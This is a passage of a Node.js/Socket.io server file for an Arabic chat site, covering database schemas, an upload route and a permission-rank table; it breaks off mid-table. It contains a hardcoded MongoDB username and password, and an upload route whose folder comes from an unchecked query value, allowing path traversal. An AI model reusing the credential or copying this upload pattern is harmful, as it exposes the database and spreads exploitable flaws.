const express = require("express");
const path = require("path");
const multer = require("multer");
const fs = require("fs");


const app = express();
const http = require("http").Server(app);
const io = require("socket.io").listen(http);
const url = "mongodb+srv://chatmo:Hsen1234@cluster0.e7hbc.mongodb.net/eyhea?retryWrites=true&w=majority"; // mongodb url
var router = express.Router();
const MongoCon = require("mongoose");
const db = MongoCon.connection;
var ektisar;
var noletter;
var siteweb;
var SystemOpen;
var BrowserOpen;
var pwer1 = {
    rank: 0,
    name: "",
    ico: "",
    kick: 0,
    delbc: 0,
    alert: 0,
    mynick: 0,
    unick: 0,
    ban: 0,
    publicmsg: 0,
    forcepm: 0,
    roomowner: 0,
    createroom: 0,
    rooms: 0,
    edituser: 0,
    setpower: 0,
    upgrades: 0,
    history: 0,
    cp: 0,
    stealth: 0,
    owner: 0,
    meiut: 0,
    loveu: 0,
    ulike: 0,
    flter: 0,
    subs: 0,
    shrt: 0,
    msgs: 0,
    bootedit: 0,
    grupes: 0,
    delmsg: 0,
    delpic: 0,
};

var myDate = new Date();
var GroupUsers = [];
function ValidateIPaddress(ipaddress) {
    if (/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ipaddress)) {
        return true;
    }
    return false;
}


function findWord(word, str) {
  return str.split(' ').some(function(w){return w === word})
}

Date.isLeapYear = function (year) {
    return (year % 4 === 0 && year % 100 !== 0) || year % 400 === 0;
};

Date.getDaysInMonth = function (year, month) {
    return [31, Date.isLeapYear(year) ? 29 : 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31][month];
};

String.prototype.replaceAll = function (str1, str2, ignore) {
    return this.replace(new RegExp(str1.replace(/([\/\,\!\\\^\$\{\}\[\]\(\)\.\*\+\?\|\<\>\-\&])/g, "\\$&"), ignore ? "gi" : "g"), typeof str2 == "string" ? str2.replace(/\$/g, "$$$$") : str2);
};

Date.prototype.isLeapYear = function () {
    return Date.isLeapYear(this.getFullYear());
};

Date.prototype.getDaysInMonth = function () {
    return Date.getDaysInMonth(this.getFullYear(), this.getMonth());
};

Date.prototype.addMonths = function (value) {
    var n = this.getDate();
    this.setDate(1);
    this.setMonth(this.getMonth() + value);
    this.setDate(Math.min(n, this.getDaysInMonth()));
    return this;
};

function randomNumber(minimum, maximum) {
    return Math.round(Math.random() * (maximum - minimum) + minimum);
}

var DateMonth = myDate.addMonths(1);

MongoCon.connect(url, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
});

db.on("connected", function () {
    console.log("database is connected!");
});

const MIME_TYPES = {
    "image/jpg": "jpg",
    "image/gif": "gif",
    "image/jpeg": "jpg",
    "image/png": "png",
    "audio/mpeg": "mp3",
    "audio/ogg": "ogg",
    "audio/wave": "wav",
    "audio/m4a": "m4a",
    "audio/wav": "wav",
    "video/mp4": "mp4",
    "video/webm": "webm",
};
var islink = "";
const storage = multer.diskStorage({
    destination: (req, file, callback) => {
        callback(null, "uploads" + islink);
    },
    filename: (req, file, callback) => {
        const name = file.originalname.split(" ").join("_");
        const extension = MIME_TYPES[file.mimetype];
        callback(null, name + Date.now() + "." + extension);
    },
});

const maxSize = 6 * 1000 * 1000;

var upload = multer({
    storage: storage,
    limits: { fileSize: maxSize },
}).single("photo");

app.post("/update3ochek", function (req, res, next) {
    if (req.query.fo) {
        islink = "/" + req.query.fo;
    } else {
        islink = "";
    }
    upload(req, res, function (err) {
        if (err) {
            res.send(err);
        } else {
            if (req.query.fo == "sico") {
                res.json({ success: req.file["filename"], status: 200, data: "sico" });
            } else if (req.query.fo == "dro3") {
                res.json({ success: req.file["filename"], status: 200, data: "dro3" });
            } else if (req.query.fo == "emo") {
                res.json({ success: req.file["filename"], status: 200, data: "emo" });
            } else {
                res.json({ success: req.file["filename"], status: 200 });
            }
        }
    });
});

var users_list = new MongoCon.Schema({
    bg: { type: String, default: "#FFFFFF" },
    co: { type: String, default: "us" },
    fp: { type: String },
    ip: { type: String },
    evaluation: { type: Number, default: 0 },
    ico: { type: String },
    id: { type: String },
    idreg: { type: String },
    lid: { type: String },
    mcol: { type: String, default: "#000000" },
    msg: { type: String, default: "(عضو جديد)" },
    pic: { type: String },
    power: { type: String, default: "" },
    rep: { type: Number, default: 0 },
    roomid: { type: String },
    stat: { type: Number, default: 0 },
    topic: { type: String },
    topic1: { type: String },
    ucol: { type: String, default: "#000000" },
    password: { type: String },
    token: { type: String },
    loginG: { type: Boolean, default: false },
    lastssen: { type: Number },
    documentationc: { type: Number, default: 0 },
    create: { type: Date, default: Date.now },
});

var logs_list = new MongoCon.Schema({
    state: { type: String },
    topic: { type: String },
    topic1: { type: String },
    ip: { type: String },
    code: { type: String, default: "en" },
    device: { type: String },
    isin: { type: String },
    time: { type: String },
});

var state_list = new MongoCon.Schema({
    state: { type: String },
    topic: { type: String },
    topic2: { type: String },
    room: { type: String },
    time: { type: String },
});

var zakrfa_list = new MongoCon.Schema({
    text1: { type: String },
    text2: { type: String },
});



var bans_system = new MongoCon.Schema({
systems: { type: Object, default: {
system1: false,
system2: false,
system3: false,
system4: false,
system5: false,
system6: false,
system7: false	
}},

browsers: { type: Object, default: {
browser1: false,
browser2: false,
browser3: false,
browser4: false,
browser5: false,
browser6: false,
browser7: false,
browser8: false,
browser9: false
}}
});

var bars_list = new MongoCon.Schema({
    bcc: { type: Array, default: [] },
    likes: { type: Array, default: [] },
    bg: { type: String },
    bid: { type: String },
    force: { type: Number, default: 0 },
    lid: { type: String },
    mcol: { type: String },
    msg: { type: String },
    pic: { type: String },
    topic: { type: String },
    ucol: { type: String },
    uid: { type: String },
});

var subscription_list = new MongoCon.Schema({
    iduser: { type: String },
    sub: { type: String },
    topic: { type: String },
    topic1: { type: String },
    time: { type: String },
    timeis: { type: String },
});

var message_list = new MongoCon.Schema({
    category: { type: String },
    adresse: { type: String },
    msg: { type: String },
});

var noletter_list = new MongoCon.Schema({
    type: { type: String },
    path: { type: String },
    v: { type: String },
});

var histroy_noltter = new MongoCon.Schema({
    ip: { type: String },
    msg: { type: String },
    topic: { type: String },
    v: { type: String },
});

var powers_list = new MongoCon.Schema({
    powers: { type: Array, default: [] },
});

var mynames_list = new MongoCon.Schema({
    iduser: { type: String },
    fp: { type: String },
    ip: { type: String },
    topic: { type: String },
    username: { type: String },
});

var settings_list = new MongoCon.Schema({
    site: {
        type: Object,
        default: {
            allowg: true,
            allowreg: true,
            background: "000000",
            bg: "337AB7",
            buttons: "337AB7",
            code: 8747,
            fileslikes: 90000,
            id: 1,
            msgst: 5,
            name: "",
            notlikes: 7000,
            pmlikes: 2000,
            siteScript: "",
            sitedescription: "",
            sitekeywords: "",
            someData: {
                lengthMsgBc: 250,
                lengthMsgPm: 250,
                lengthMsgRoom: 250,
                lengthUserG: 100,
                lengthUserReg: 100,
                likeMsgRoom: 8,
                likeTopicEdit: 100,
                likeUpImgBc: 500,
                likeUpPic: 10,
            },
            title: "",
            walllikes: {
                lengthMsgBc: 250,
                lengthMsgPm: 250,
                lengthMsgRoom: 250,
                lengthUserG: 100,
                lengthUserReg: 100,
                likeMsgRoom: 8,
                likeTopicEdit: 100,
                likeUpImgBc: 500,
                likeUpPic: 10,
            },
            wallminutes: 0,
        },
    },
    dro3: {
        type: Array,
        default: [
            "1604251747557.gif",
            "1604251758520.gif",
            "1604251760700.gif",
            "1604251763307.gif",
            "1604251765529.gif",
            "1604251767731.gif",
            "1604251769909.gif",
            "1604251774614.gif",
            "1604251779064.gif",
            "1604251782799.gif",
            "1604251786594.gif",
            "1604251790351.gif",
            "1604251794339.gif",
            "1604251798073.gif",
            "1604251802309.gif",
            "1604251806907.gif",
            "1604251810741.gif",
            "1604251814784.gif",
            "1604251819379.gif",
            "1604251823185.gif",
            "1604251827989.gif",
            "1604251831990.gif",
            "1604251838469.gif",
            "1604251842627.gif",
            "1604251846871.gif",
        ],
    },
    emo: {
        type: Array,
        default: [
            "1604249548786.gif",
            "1604249552249.gif",
            "1604249557389.gif",
            "1604249559586.gif",
            "1604249562578.gif",
            "1604249565103.gif",
            "1604249567441.gif",
            "1604249569890.gif",
            "1604249571683.gif",
            "1604250112044.gif",
            "1604250114824.gif",
            "1604250117129.gif",
            "1604250119159.gif",
            "1604250121260.gif",
            "1604250123684.gif",
            "1604250127012.gif",
            "1604250130267.gif",
            "1604250132979.gif",
            "1604250135135.gif",
            "1604250137078.gif",
            "1604250139418.gif",
            "1604250141554.gif",
            "1604250143949.gif",
            "1604250148416.gif",
            "1604250151626.gif",
            "1604250157583.gif",
            "1604250161010.gif",
            "1604250164058.gif",
            "1604250167093.gif",
            "1604250301035.gif",
            "1604250303382.gif",
            "1604250305101.gif",
            "1604250307243.gif",
            "1604250309516.gif",
            "1604250311419.gif",
            "1604250313565.gif",
            "1604250315773.gif",
            "1604250323110.gif",
            "1604250325576.gif",
            "1604250327685.gif",
            "1604250329596.gif",
            "1604250331537.gif",
            "1604250333377.gif",
            "1604250334834.gif",
            "1604250336616.gif",
            "1604250340845.gif",
            "1604250346903.gif",
            "1604250349821.gif",
            "1604250354191.gif",
            "1604250358585.jpg",
            "1604250362533.gif",
            "1604250367896.gif",
            "1604250371828.gif",
            "1604250375168.gif",
            "1604250377594.gif",
            "1604250380972.gif",
            "1604250384257.gif",
            "1604250390033.gif",
            "1604250393546.gif",
            "1604250397003.gif",
            "1604250400613.gif",
            "1604250409783.gif",
            "1604250413521.gif",
            "1604250418953.gif",
            "1604250428173.gif",
            "1604250431155.gif",
            "1604250435106.gif",
            "1604250439658.gif",
            "1604250442352.gif",
            "1604250551879.gif",
            "1604250555824.gif",
            "1604250559464.gif",
            "1604250563413.gif",
            "1604250566534.gif",
            "1604250568887.gif",
            "1604250572365.gif",
            "1604250579238.gif",
            "1604250592362.gif",
            "1604250597399.gif",
            "1604250603151.gif",
            "1604250613781.gif",
            "1604250620547.gif",
            "1604266996909.gif",
            "1604267106601.gif",
            "1604267183015.gif",
            "1604268709762.gif",
            "1604268716314.gif",
            "1604268722266.gif",
            "1604268727700.gif",
            "1604268733058.gif",
            "1604270678107.gif",
            "1604270684014.gif",
            "1604270690418.gif",
            "1604270696386.gif",
            "1604270702962.gif",
            "1604270708211.gif",
            "1604270713261.gif",
            "1604270718635.gif",
            "1604270725155.gif",
            "1604270729648.gif",
            "1604271739357.gif",
            "1604271750817.gif",
            "1604271756616.gif",
            "1604271761902.gif",
            "1604280039934.png",
            "1604280206207.gif",
            "1604287427389.gif",
            "1604481943094.gif",
            "1604483666879.gif",
            "1605830633143.gif",
            "1605830635667.gif",
            "1605830637741.gif",
            "1605830640364.gif",
            "1605830646183.gif",
            "1605830648792.gif",
            "1605830651332.gif",
            "1605830653983.gif",
            "1605830656198.gif",
            "1605830671170.gif",
            "1605830683417.png",
            "1605830695027.gif",
            "1605830951762.gif",
            "1605830953762.gif",
            "1605830955927.gif",
            "1605830958729.gif",
            "1605830960670.gif",
            "1605830962609.gif",
            "1605830964865.gif",
            "1605830967037.gif",
            "1605830968785.gif",
            "1605830971041.gif",
            "1605830973374.gif",
            "1605830975384.gif",
            "1605830977358.gif",
            "1605830981248.gif",
            "1605830985392.jpg",
            "1605830988749.gif",
            "1605830995027.gif",
        ],
    },
    sico: {
        type: Array,
        default: [
            "1604252172995.gif",
            "16065770621985.jpg",
            "1604252176284.gif",
            "1604252184298.gif",
            "1604252186337.gif",
            "1604252189266.gif",
            "1604252190912.gif",
            "1604252193896.gif",
            "1604252195837.gif",
            "1604252198211.gif",
            "1604252200570.gif",
            "1604252202543.gif",
            "1604252206680.gif",
            "1604252209740.gif",
            "1604252220270.gif",
            "1604252225797.gif",
            "1604252235687.png",
            "1604252245119.png",
            "1604252250114.gif",
            "1604252254204.gif",
            "1604252257907.gif",
            "1604252260131.gif",
            "1604252264678.gif",
            "1604252268079.gif",
            "1604252274470.gif",
            "1604252284576.gif",
            "1604252287259.gif",
            "1604252290261.gif",
            "1604252292834.gif",
            "1604252295129.gif",
            "1604252297722.gif",
            "1604252299533.gif",
            "1604252301551.gif",
            "1604252303892.gif",
            "1604252308631.gif",
            "1604252318054.gif",
            "1604252322348.gif",
            "1604252324629.gif",
            "1604252327278.gif",
            "1604252330524.gif",
            "1604252333375.gif",
            "1604252335817.gif",
            "1604252340230.gif",
            "1604252342353.gif",
            "1604252344604.gif",
            "1604252363748.gif",
            "1604252368063.gif",
            "1604252370700.gif",
            "1604252378615.jpg",
        ],
    },
});

var rooms_list = new MongoCon.Schema({
    about: { type: String },
    user: { type: String },
    delete: { type: Boolean, default: false },
    needpass: { type: Boolean, default: false },
    id: { type: String },
    pass: { type: String },
    max: { type: Number, default: 0 },
    owner: { type: String },
    pic: { type: String },
    topic: { type: String },
    welcome: { type: String },
});

var bands_list = new MongoCon.Schema({
    name_band: { type: String },
    type: { type: String },
    decoderDans: { type: Boolean, default: false },
    device_band: { type: String },
    ip_band: { type: String },
    date: { type: String, default: "دائم" },
});

const messages_list = MongoCon.model("al3ochek_welcomes", message_list);
const subscriptions_list = MongoCon.model("al3ochek_Subscriptions", subscription_list);
const bar_list = MongoCon.model("al3ochek_bars", bars_list);
const bans_list = MongoCon.model("al3ochek_isband", bans_system);
const states_list = MongoCon.model("al3ochek_statse", state_list);
const zak_list = MongoCon.model("al3ochek_zkrfa", zakrfa_list);
const log_list = MongoCon.model("al3ochek_logs", logs_list);
const user_list = MongoCon.model("al3ochek_users", users_list);
const power_list = MongoCon.model("al3ochek_powers", powers_list);
const myname_list = MongoCon.model("al3ochek_names", mynames_list);
const noletters_list = MongoCon.model("al3ochek_letters", noletter_list);
const histroys_noltter = MongoCon.model("al3ochek_historyletter", histroy_noltter);
const setting_list = MongoCon.model("al3ochek_settings", settings_list);
const room_list = MongoCon.model("al3ochek_rooms", rooms_list);
const band_list = MongoCon.model("al3ochek_bands", bands_list);

const UserEntre = [];
const UserInfo = {};
const OnlineUser = [];
var roomslists = [];
var online = [];

function stringGen(len) {
    var text = "";
    var charset = "abcdefghijklmnopqrstuvwxyz0123456789";
    for (var i = 0; i < len; i++) text += charset.charAt(Math.floor(Math.random() * charset.length));
    return text;
}

function toEnglishDigits(str) {
    var e = "۰".charCodeAt(0);
    str = str.replace(/[۰-۹]/g, function (t) {
        return t.charCodeAt(0) - e;
    });

    e = "٠".charCodeAt(0);
    str = str.replace(/[٠-٩]/g, function (t) {
        return t.charCodeAt(0) - e;
    });
    return str;
}

function getRandomInt(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min)) + min;
}

app.use(express.static(__dirname + "/public"));

app.get("/cp/token=*", function (req, res, next) {
    res.sendFile(path.join(__dirname + "/public/cp.html"));
});

app.use(express.static("uploads"));

var emos = [];
var dro3s = [];
var sicos = [];
var ispowers;
/*var save_noti = new power_list();
save_noti.powers = powers;
save_noti.save(function(err, save_not){
if(err) throw err;
if(save_not){
}
});*/

io.on("connection", function (socket) {
    power_list.findOne({ _id: "5fb8ff22a7bab610707bbf86" }, function (err, data) {
        if (err) throw err;
        if (data) {
            ispowers = data["powers"];
            app.get("/getonline", function (req, res, next) {
                const ison = online.findIndex((x) => x.s == true);
                if (ison == -1) {
                    res.end(JSON.stringify({ powers: data["powers"], online: online }));
                }
            });
        }
    });

    /*
bcc: []
bg: "#FFFFFF"
bid: "nOK9fgm5dw"
force: 1
lid: "877f3c7a38e8219432563e115726ec77"
likes: []
mcol: "#000000"
msg: " <a href="up/1607268861082.png" target="_blank"  class="uplink">up/1607268861082.png</a>"
pic: "pic/1607268609679.jpg.png"
topic: "mahdi"
ucol: "#000000"
uid: "7wVyVpyaUrPs1uy"
*/

    socket.on("restartSokcet", function (data) {
        if (data) {
            user_list.findOne({ token: data.token }, function (err, istoken) {
                if (err) throw err;
                if (istoken) {
                    if (istoken.power == "chatmaster" || istoken.power == "DookMobile") {
                        if (data.state == 1) {
                            socket.emit("savedone", "تم اعادة تشغل الدردشة");
                            savestate({ state: "إعادة تشغل الدردشة", topic: istoken.topic, topic1: istoken.topic1, room: "", time: new Date().getTime() });
                            process.exit(1);
                        } else if (data.state == 2) {
                            states_list.remove({}, function (err, res) {
                                if (err) throw err;
                                if (res) {
                                    socket.emit("savedone", "تم حذف سجل الحالات");
                                    savestate({ state: "حذف سجل الحالات", topic: istoken.topic, topic1: istoken.topic1, room: "", time: new Date().getTime() });
                                }
                            });
                        } else if (data.state == 3) {
                            log_list.remove({}, function (err, res) {
                                if (err) throw err;
                                if (res) {
                                    socket.emit("savedone", "تم حذف سجل الدخول");
                                    savestate({ state: "حذف سجل الدخول", topic: istoken.topic, topic1: istoken.topic1, room: "", time: new Date().getTime() });
                                }
                            });
                        } else if (data.state == 4) {
                            socket.emit("savedone", "يمكنك عمل نسخ احتياطي كل 24 ساعه");
                        } else if (data.state == 5) {
                            socket.emit("savedone", "لا يمكنك إسترجاح نسخة حالياا");
                        }
                    } else {
                        socket.emit("savedone", "ليس لديك الصلاحية لاعادة تشغل الدردشة");
                    }
                }
            });
        }
    });

    function welcomemsg() {
        setTimeout(function () {
            messages_list.find({ category: "d" }, function (err, wlc) {
                if (err) throw err;
                if (wlc) {
                    const rdm = randomNumber(0, wlc.length - 1);
                    socket.emit("msg", {
                        cmd: "msg",
                        data: {
                            bg: "",
                            class: "pmsgc",
                            force: 0,
                            topic: wlc[rdm].adresse || "",
                            msg: wlc[rdm].msg || "",
                            ucol: "red",
                            mcol: "#000000",
                            roomid: "efOiAhhNdL",
                            pic: "room.png",
                            uid: "",
                        },
                    });
                }
            });

            welcomemsg();
        }, 60000 * 5);
    }

    function StartNewServer() {
        //RoomNew
        room_list.find({}, function (err, room) {
            if (err) throw err;
            if (room.length == 0) {
                var save_room = new room_list();
                save_room.about = "غرفه عامة";
                save_room.user = "MobileHost";
                save_room.delete = false;
                save_room.id = "efOiAhhNdL";
                save_room.max = 40;
                save_room.pass = "";
                save_room.needpass = false;
                save_room.owner = "#1";
                save_room.topic = "الغرفة العامة";
                save_room.welcome = "مرحبا بيكم و حياكم في الغرفة العامة";
                save_room.pic = "room.png";
                save_room.save(function (err, saveroom) {
                    if (err) throw err;
                    if (saveroom) {
                    }
                });
            }
        });

        setting_list.find({}, function (err, seetting) {
            if (err) throw err;
            if (seetting.length == 0) {
                var save_setting = new setting_list();
                save_setting._id = "5fc3b0fbed6d071214a4f009";
                save_setting.save(function (err, saveset) {
                    if (err) throw err;
                    if (saveset) {
                    }
                });
            }
        });

		bans_list.find({}, function (err, bans) {
            if (err) throw err;
            if (bans.length == 0) {
                var save_bans = new bans_list();
                save_bans._id = "5fc3b0fbed6d071214a4f999";
                save_bans.save(function (err, savesebt) {
                    if (err) throw err;
                    if (savesebt) {
                    }
                });
            }else{
bans_list.findOne({ _id: "5fc3b0fbed6d071214a4f999" }, function (err, sres) {
if (err) throw err;
if(sres){
SystemOpen = sres.systems;
BrowserOpen = sres.browsers;
}
});
			};
        });
        //RoomNew
        power_list.find({}, function (err, power) {
            if (err) throw err;
            if (power.length == 0) {
                var save_power = new power_list();
                save_power._id = "5fb8ff22a7bab610707bbf86";
                save_power.powers = [
                    {
                        rank: 0,
                        name: "",
                        ico: "",
                        kick: 0,
                        delbc: 0,
                        alert: 0,
                        mynick: 0,
                        unick: 0,
                        ban: 0,
                        publicmsg: 0,
                        forcepm: 0,
                        roomowner: 0,
                        createroom: 0,
                        rooms: 0,
                        edituser: 0,
                        setpower: 0,
                        upgrades: 0,
                        history: 0,
                        cp: 0,
                        stealth: 0,
                        owner: 0,
                        meiut: 0,
                        loveu: 0,
                        ulike: 0,
                        flter: 0,
                        subs: 0,
                        shrt: 0,
                        msgs: 0,
                        bootedit: 0,
                        grupes: 0,
                        delmsg: 0,
                        delpic: 0,
                    },
                    {
                        rank: 9999,
                        name: "DookMobile",
                        ico: "",
                        kick: 1000,
                        delbc: 1,
                        alert: 1,
                        mynick: 1,
                        unick: 1,
                        ban: 1,
                        publicmsg: 1000,
                        forcepm: 1,
                        roomowner: 1,
                        createroom: 1,
                        rooms: 1000,
                        edituser: 1,
                        setpower: 1,
                        upgrades: 1000,
                        history: 1,
                        cp: 1,
                        stealth: 1,
                        owner: 1,
                        meiut: 1,
                        loveu: 1,
                        ulike: 1,
                        flter: 1,
                        subs: 1,
                        shrt: 1,
                        msgs: 1,
                        bootedit: 1,
                        grupes: 1,
                        delmsg: 1,
                        delpic: 1,
                    },
                    {
                        rank: 9000,
                        name: "chatmaster",
                        ico: "1606913130940.gif",
                        kick: 1000,
                        delbc: 1,
                        alert: 1,
                        mynick: 1,
                        unick: 1,
                        ban: 1,
                        publicmsg: 150000,
                        forcepm: 1,
                        roomowner: 1,
                        createroom: 1,
                        rooms: 1000,
                        edituser: 1,
                        setpower: 1,
                        upgrades: 1000,
                        history: 1,
                        cp: 1,
                        stealth: 1,
                        owner: 1,
                        meiut: 1,
                        loveu: 1,
                        ulike: 1,
                        flter: 1,
                        subs: 1,
                        shrt: 1,
                        msgs: 1,
                        bootedit: 1,
                        grupes: 1,
                        delmsg: 1,
                        delpic: 1,
                    },
                    {
                        rank: 9002,
                        name: "chatmaster2",
                        ico: "",
                        kick: 1000,
                        delbc: true,
                        alert: true,
                        mynick: true,
                        unick: true,
                        ban: true,
                        publicmsg: 1000,
                        forcepm: true,
                        loveu: true,
                        roomowner: true,
                        createroom: true,
                        rooms: 1000,
                        edituser: true,
                        meiut: true,
                        ulike: true,
                        flter: true,
                        subs: true,
                        shrt: true,
                        msgs: true,
                        bootedit: true,
                        setpower: true,
                        upgrades: 1000,
                        history: true,
                        cp: true,
                        grupes: true,
                        delpic: true,
                        delmsg: true,
                        stealth: true,
                        owner: true,
                    },
                    {
                        rank: 9000,
                        name: "الــــعـــراقي",
                        ico: "1604252172995.gif",
                        kick: 1000,
                        delbc: true,
                        alert: true,
                        mynick: true,
                        unick: true,
                        ban: true,
                        publicmsg: 1000,
                        forcepm: true,
                        loveu: true,
                        roomowner: true,
                        createroom: true,
                        rooms: 1000,
                        edituser: true,
                        meiut: true,
                        ulike: true,
                        flter: true,
                        subs: true,
                        shrt: true,
                        msgs: true,
                        bootedit: true,
                        setpower: true,
                        upgrades: 1000,
                        history: true,
                        cp: true,
                        grupes: true,
                        delpic: true,
                        delmsg: true,
                        stealth: true,
                        owner: true,
                    },
                    {
                        rank: 40,
                        name: "~> نجمه _ سوده <~",
                        ico: "1604252318054.gif",
                        kick: 1000,
                        delbc: 1,
                        alert: 1,
                        mynick: 1,
                        unick: 0,
                        ban: 0,
                        publicmsg: 1,
                        forcepm: 0,
                        roomowner: 0,
                        createroom: 0,
                        rooms: 1000,
                        edituser: 0,
                        setpower: 0,
                        upgrades: 1000,
                        history: 0,
                        cp: 0,
                        stealth: 0,
                        owner: 0,
                        meiut: 0,
                        loveu: 0,
                        ulike: 0,
                        flter: 0,
                        subs: 0,
                        shrt: 0,
                        msgs: 0,
                        bootedit: 0,
                        grupes: 0,
                        delmsg: 0,
                        delpic: 0,
                    },
                    {
                        rank: 50,
                        name: "~> نجمه _ خضره <~",
                        ico: "1604252330524.gif",
                        kick: 1000,
                        delbc: 1,
                        alert: 1,
                        mynick: 1,
                        unick: 1,
                        ban: 0,
                        publicmsg: 1,
                        forcepm: 0,
                        roomowner: 0,
                        createroom: 0,
                        rooms: 1000,
                        edituser: 0,
                        setpower: 0,
                        upgrades: 1000,
                        history: 0,
                        cp: 0,
                        stealth: 0,
                        owner: 0,
                        meiut: 0,
                        loveu: 0,
                        ulike: 0,
                        flter: 0,
                        subs: 0,
                        shrt: 0,
                        msgs: 0,
                        bootedit: 0,
                        grupes: 0,
                        delmsg: 0,
                        delpic: 0,
                    },
                    {
                        rank: 40,
                        name: "~> نجمه _ حمره <~",
                        ico: "1604345493932.gif",
                        kick: 1000,
                        delbc: 1,
                        alert: 1,
                        mynick: 1,
                        unick: 0,
                        ban: 0,
                        publicmsg: 1,
                        forcepm: 0,
                        roomowner: 0,
                        createroom: 0,
                        rooms: 1000,
                        edituser: 0,
                        setpower: 0,
                        upgrades: 1000,
                        history: 0,
                        cp: 0,
                        stealth: 0,
                        owner: 0,
                        meiut: 0,
                        loveu: 0,
                        ulike: 0,
                        flter: 0,
                        subs: 0,
                        shrt: 0,
                        msgs: 0,
                        bootedit: 0,
                        grupes: 0,
                        delmsg: 0,
                        delpic: 0,
                    },
                    {
                        rank: 500,
                        name: "~> ماستر _ فضي<~",
                        ico: "1604252202543.gif",
                        kick: 1000,
                        delbc: 1,
                        alert: 1,
                        mynick: 1,
                        unick: 1,
                        ban: 0,
                        publicmsg: 1,
                        forcepm: 1,
                        roomowner: 1,
                        createroom: 0,
                        rooms: 1000,
                        edituser: 0,
                        setpower: 0,
                        upgrades: 1000,
                        history: 0,
                        cp: 0,
                        stealth: 0,
                        owner: 0,
                        meiut: 1,
                        loveu: 1,
                        ulike: 1,
                        flter: 0,
                        subs: 0,
                        shrt: 0,
                        msgs: 0,
                        bootedit: 0,
                        grupes: 0,
                        delmsg: 1,
                        delpic: 1,
                    },
                    {
                        rank: 600,
                        name: "~> ماستر _ ذهب<~",
                        ico: "1604252200570.gif",
                        kick: 1000,
                        delbc: 1,
                        alert: 1,
                        mynick: 1,
                        unick: 1,
                        ban: 1,
                        publicmsg: 10,
                        forcepm: 1,
                        roomowner: 0,
                        createroom: 1,
                        rooms: 1000,
                        edituser: 0,
                        setpower: 0,
                        upgrades: 1000,
                        history: 0,
                        cp: 0,
                        stealth: 0,
                        owner: 0,
                        meiut: 1,
                        loveu: 1,
                        ulike: 1,
                        flter: 0,
                        subs: 0,
                        shrt: 0,
                        msgs: 0,
                        bootedit: 0,
                        grupes: 0,
                        delmsg: 1,
                        delpic: 1,
                    },
                    {
                        rank: 100,
                        name: "~> درع_ اسود<~",
                        ico: "1604252295129.gif",
                        kick: 1000,
                        delbc: 1,
                        alert: 1,
                        mynick: 1,
                        unick: 1,
                        ban: 0,
                        publicmsg: 1,
                        forcepm: 1,
                        roomowner: 0,
                        createroom: 0,
                        rooms: 1000,
                        edituser: 0,
                        setpower: 0,
                        upgrades: 1000,
                        history: 0,
                        cp: 0,
                        stealth: 0,
                        owner: 0,
                        meiut: 1,
                        loveu: 1,
                        ulike: 1,
                        flter: 0,
                        subs: 0,
                        shrt: 0,
                        msgs: 0,
                        bootedit: 0,
                        grupes: 0,
                        delmsg: 0,
                        delpic: 1,
                    },
                    {
                        rank: 101,
                        name: "~> درع_ صفر<~",
                        ico: "1604252292834.gif",
                        kick: 1000,
                        delbc: 1,
                        alert: 1,
                        mynick: 1,
                        unick: 1,
                        ban: 0,
                        publicmsg: 1,
                        forcepm: 1,
                        roomowner: 0,
                        createroom: 0,
                        rooms: 1000,
                        edituser: 0,
                        setpower: 0,
                        upgrades: 1000,
                        history: 0,
                        cp: 0,
                        stealth: 0,
                        owner: 0,
                        meiut: 1,
                        loveu: 1,
                        ulike: 1,
                        flter: 0,
                        subs: 0,
                        shrt: 0,
                        msgs: 0,
                        bootedit: 0,
                        grupes: 0,
                        delmsg: 0,
                        delpic: 1,
                    },
                    {
                        rank: 8997,
                        name: "خاص سومه",
                        ico: "1604252225797.gif",
                        kick: 1000,
                        delbc: true,
                        alert: true,
                        mynick: true,
                        unick: true,
                        ban: true,
                        publicmsg: 1000,
                        forcepm: true,
                        loveu: true,
                        roomowner: true,
                        createroom: true,
                        rooms: 1000,
                        edituser: true,
                        meiut: true,
                        ulike: true,
                        flter: true,
                        subs: true,
                        shrt: true,
                        msgs: true,
                        bootedit: true,
                        setpower: true,
                        upgrades: 1000,
                        history: true,
                        cp: true,
                        grupes: true,
                        delpic: true,
                        delmsg: true,
                        stealth: true,
                        owner: true,
                    },
                    {
                        rank: 600,
                        name: "ماستر  احمر",
                        ico: "1604252209740.gif",
                        kick: 1000,
                        delbc: 1,
                        alert: 1,
                        mynick: 1,
                        unick: 1,
                        ban: 1,
                        publicmsg: 10,
                        forcepm: 1,
                        roomowner: 0,
                        createroom: 0,
                        rooms: 1000,
                        edituser: 0,
                        setpower: 0,
                        upgrades: 1000,
                        history: 0,
                        cp: 0,
                        stealth: 0,
                        owner: 0,
                        meiut: 1,
                        loveu: 1,
                        ulike: 1,
                        flter: 0,
                        subs: 0,
                        shrt: 0,
                        msgs: 0,
                        bootedit: 0,
                        grupes: 0,
                        delmsg: 1,
                        delpic: 1,
                    },
                    {
                        rank: 600,
                        name: "ماستر بنفسجي",
                        ico: "1604252198211.gif",
                        kick: 1000,
                        delbc: 1,
                        alert: 1,
                        mynick: 1,
                        unick: 1,
                        ban: 1,
                        publicmsg: 10,
                        forcepm: 1,
                        roomowner: 0,
                        createroom: 0,
                        rooms: 1000,
                        edituser: 0,
                        setpower: 0,
                        upgrades: 1000,
                        history: 0,
                        cp: 0,
                        stealth: 0,
                        owner: 0,
                        meiut: 1,
                        loveu: 1,
                        ulike: 1,
                        flter: 0,
                        subs: 0,
                        shrt: 0,
                        msgs: 0,
                        bootedit: 0,
                        grupes: 0,
                        delmsg: 1,
                        delpic: 1,
                    },
                    {
                        rank: 700,
                        name: "درع",
                        ico: "1604252295129.gif",
                        kick: 1000,
                        delbc: 1,
                        alert: 1,
                        mynick: 1,
                        unick: 1,
                        ban: 1,
                        publicmsg: 10,
                        forcepm: 1,
                        roomowner: 0,
                        createroom: 0,
                        rooms: 1000,
                        edituser: 0,
                        setpower: 0,
                        upgrades: 1000,
                        history: 0,
                        cp: 0,
                        stealth: 0,
                        owner: 0,
                        meiut: 1,
                        loveu: 1,
                        ulike: 1,
                        flter: 0,
                        subs: 0,
                        shrt: 0,
                        msgs: 0,
                        bootedit: 0,
                        grupes: 0,
